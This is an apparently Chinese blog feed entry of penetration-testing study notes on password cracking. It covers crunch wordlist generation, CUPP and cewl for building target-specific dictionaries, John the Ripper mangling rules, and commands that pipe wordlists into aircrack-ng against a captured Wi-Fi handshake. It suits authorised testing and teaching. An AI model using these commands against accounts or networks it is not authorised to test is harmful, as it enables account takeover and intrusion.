-    <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h3><p>目标系统实施了强安全措施</p><ul><li>安装了所有补丁 </li><li>无任何已知漏洞 </li><li>无应用层漏洞 </li><li>攻击面最小化<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><strong>社会工程学</strong></h4>获取目标系统用户身份 </li><li>非授权用户不受信，认证用户可以访问守信资源 </li><li>已有用户账号权限受限，需要提权 </li><li>不会触发系统报警</li></ul><h4 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a><strong>身份认证方法</strong></h4><ul><li>证明你是你声称你是的那个人</li><li>你知道什么（账号密码、pin、passphrase） </li><li>你有什么（令牌、token、key、证书、密宝、手机）</li><li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别） </li><li>以上方法结合使用（多因素身份认证）<br>基于互联网的身份验证仍以账号密码为主要形式</li></ul><blockquote><h3 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a><strong>密码破解方法</strong></h3></blockquote><h4 id="人工猜解"><a href="#人工猜解" class="headerlink" title="人工猜解"></a><strong>人工猜解</strong></h4><ul><li>垃圾桶工程</li><li>被动信息收集 <h4 id="基于字典暴力破解（主流）"><a href="#基于字典暴力破解（主流）" class="headerlink" title="基于字典暴力破解（主流）"></a>基于字典暴力破解（主流）</h4><h4 id="键盘空间字符暴破"><a href="#键盘空间字符暴破" class="headerlink" title="键盘空间字符暴破"></a>键盘空间字符暴破</h4></li></ul><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul><li>保存有用户名和密码的文本文件 </li><li>/usr/share/wordlist </li><li>/usr/share/wfuzz/wordlist </li><li>/usr/share/seclists</li></ul><blockquote><h3 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a><strong>字典</strong></h3></blockquote><h4 id="键盘空间字符爆破"><a href="#键盘空间字符爆破" class="headerlink" title="键盘空间字符爆破"></a>键盘空间字符爆破</h4><ul><li>全键盘空间字符</li><li>部分键盘空间字符 (基于规则)</li><li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li></ul><h4 id="crunch-创建字典"><a href="#crunch-创建字典" class="headerlink" title="crunch 创建字典"></a><strong>crunch 创建字典</strong></h4><pre><code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]&lt;charset string&gt; 默认是小写字符crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100-b 按大小分割字典文件(kb/kib、mb/mib、gb/gib)-c 每个字典的行数以上两个参数必须与-o START 结合使用-d 同一字符连贯出现数量(11 / aaa)</code></pre><h4 id="使用字符集"><a href="#使用字符集" class="headerlink" title="使用字符集"></a><strong>使用字符集</strong></h4><p><code>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></p><h4 id="无重复字符"><a href="#无重复字符" class="headerlink" title="无重复字符"></a><strong>无重复字符</strong></h4><p><code>crunch 1 1 -p 1234567890 | more</code><br>    必须是最后一个参数<br>    最大、最小字符长度失效，但必须存在<br>    与-s 参数不兼容（-s 指定起始字符串）<br><code>crunch 4 4 0123456789 -s 9990</code></p><ul><li>读取文件中每行内容作为基本字符生成字典<br><code>crunch 1 1 -q read</code></li></ul><h4 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a><strong>字典组成规则</strong></h4><pre><code>crunch 6 6 -t @,%%^^ | more</code></pre><ul><li>@：小写字母 lalpha</li><li>,：大写字母 ualpha</li><li>%：数字 numeric</li><li>^：符号 symbols<h4 id="输出文件压缩"><a href="#输出文件压缩" class="headerlink" title="输出文件压缩"></a><strong>输出文件压缩</strong></h4>  <code>crunch 4 4 -t @,%^ -o 1.txt -z 7z</code><br>   其他压缩格式：gzip、bzip2、lzma<br>   7z压缩比率最大</li></ul><p><strong>Use example:</strong></p><pre><code>crunch 4 4 -f /usr/share/crunch/charset.lst mixalphanumeric-all-space -o w.txt -t @d@@ -s cdabcrunch 4 5 -p dog cat birdcrunch 5 5 abc DEF + \!@# -t ,@^%,    + 占位符    \ 转义符(空格、符号)crunch 5 5 -t ddd%% -p dog cat bird    任何不同于-p 参数指定的值都是占位符crunch 5 5 -d 2@ -t @@@%%组合破解工具应用 crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd</code></pre><h4 id="按个人信息生成其专属的密码字典"><a href="#按个人信息生成其专属的密码字典" class="headerlink" title="按个人信息生成其专属的密码字典"></a><strong>按个人信息生成其专属的密码字典</strong></h4><p><strong>CUPP：Common User Password Profiler</strong><br>    git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a><br>    python cup.py -i</p><p>通过收集网站信息生成字典<br>    cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt<br>    -m：最小单词长度<br>    -e：收集包含email地址信息<br>    -c：每个单词出现次数<br>    支持基本、摘要 身份认证<br>    支持代理<br><strong>用户密码变型</strong></p><ul><li>基于 cewl 的结果进行密码变型 </li><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号互相转换 </li><li>字母与数字互相转换 </li><li>P@$$w0rd</li></ul><p><strong>使用 John the Ripper 配置文件实现密码动态变型</strong><br>    /etc/john/john.conf<br>    [List.Rules:Wordlist]<br>    $[0-9]$[0-9]$[0-9]<br>    john –wordlist=cewl.txt –rules –stdout &gt; m.txt</p><pre><code>[List.Rules:test]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`~!@#$%^&amp;*()\-_=+]john --wordlist=cewl.txt --rules=test --stdout &gt; m.txtjohn --wordlist=ahm.lst --rules=test HASHFILE</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;&lt;strong&gt;思路&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;目标系统实施了强安全措施&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;安装了所有补丁 &lt;/li&gt;
-&lt;li&gt;无任何已知漏洞 &lt;
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
-    
-      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
-    
-    
-      <category term="Wordlist" scheme="http://c.cat.plus/tags/Wordlist/"/>
-    
-      <category term="crunch" scheme="http://c.cat.plus/tags/crunch/"/>
     
   </entry>
   
